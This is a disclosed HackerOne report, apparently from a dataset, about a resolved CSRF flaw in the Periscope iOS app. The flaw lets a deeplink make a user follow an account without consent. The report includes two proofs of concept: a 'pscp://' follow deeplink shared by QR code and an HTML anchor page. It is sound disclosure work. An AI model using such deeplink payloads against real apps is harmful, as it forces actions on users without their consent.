---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '805073'
original_report_id: '805073'
title: Periscope iOS app CSRF in follow action due to deeplink
weakness: Cross-Site Request Forgery (CSRF)
team_handle: x
created_at: '2020-02-26T09:10:46.564Z'
disclosed_at: '2020-03-31T22:53:53.375Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 53
asset_identifier: '*.pscp.tv'
asset_type: WILDCARD
max_severity: none
tags:
- hackerone
- cross-site-request-forgery-csrf
---

# Periscope iOS app CSRF in follow action due to deeplink

## Metadata

- HackerOne Report ID: 805073
- Weakness: Cross-Site Request Forgery (CSRF)
- Program: x
- Disclosed At: 2020-03-31T22:53:53.375Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Summary

This issue is mainly in the Periscope iOS app against CSRF follow action using deeplink.

as the report  #583987 the CSRF work on iOS app 

POC 1

QR code to follow periscope profile 

`pscp://user/periscopeco/follow
`

███████

POC2 by kunal94

```
<!DOCTYPE html>
<html>
<a href="pscp://user/<any user-id>/follow">CSRF DEMO</a>
</html>
```
video
█████████

## Impact

CSRF Follow against any user in periscope iOS app

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
